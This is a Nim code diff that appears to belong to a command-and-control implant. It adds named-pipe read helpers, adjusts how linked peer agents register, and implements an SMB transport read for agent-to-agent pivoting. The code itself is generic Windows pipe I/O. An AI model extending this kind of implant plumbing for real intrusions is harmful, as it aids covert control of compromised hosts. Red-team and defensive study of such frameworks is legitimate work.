@@ -6,7 +6,7 @@ import ../../../common/[types, utils, serialize]
 const PIPE_BUFFER_MAX = 0x10000 # 65536 
 
 # Helper functions
-proc pipeWrite*(hPipe: HANDLE, data: seq[byte]): bool = 
+proc pipeWrite*(hPipe: HANDLE, data: seq[byte]): bool {.discardable.} = 
     var 
         dwBytesWritten: DWORD = 0
         dwTotal: DWORD = 0
@@ -31,6 +31,23 @@ proc pipeRead*(hPipe: HANDLE, size: DWORD): seq[byte] =
                 raise newException(CatchableError, GetLastError().getError())
         dwTotal += dwBytesRead
     
+proc pipeRead*(hPipe: HANDLE): seq[byte] = 
+    var 
+        dwSize: DWORD = 0
+        dwBytesRead: DWORD = 0
+        dwTotal: DWORD = 0
+    
+    if PeekNamedPipe(hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
+        raise newException(CatchableError, GetLastError().getError())
+
+    if dwSize > 0: 
+        result = newSeq[byte](dwSize)
+        while dwTotal < dwSize:            
+            if ReadFile(hPipe, cast[LPVOID](addr result[dwTotal]), min(dwSize - dwTotal, PIPE_BUFFER_MAX), addr dwBytesRead, NULL) == FALSE:
+                if GetLastError() != ERROR_MORE_DATA:
+                    raise newException(CatchableError, GetLastError().getError())
+            dwTotal += dwBytesRead
+
 proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =   
     var 
         hPipe: HANDLE = 0
@@ -63,6 +80,8 @@ proc link*(ctx: AgentCtx, pipeName: string): seq[byte] =
     
     # Parse registration packet
     var unpacker = Unpacker.init(Bytes.toString(data))
+    discard unpacker.getUint8()
+    discard unpacker.getUint32()
     let agentId = unpacker.deserializeHeader().agentId
 
     ctx.links[cast[uint32](agentId)] = cast[uint32](hPipe)
@@ -135,4 +154,15 @@ when defined(TRANSPORT_SMB):
                 return false
     
     proc smbRead*(ctx: AgentCtx): string = 
-        discard
+        var 
+            dwSize: DWORD = 0
+            data: seq[byte]
+
+        if PeekNamedPipe(ctx.transport.hPipe, NULL, 0, NULL, addr dwSize, NULL) == FALSE:
+            ctx.registered = false
+            raise newException(CatchableError, GetLastError().getError())
+
+        if dwSize > 0: 
+            data = ctx.transport.hPipe.pipeRead(dwSize)
+            return Bytes.toString(data)
+        
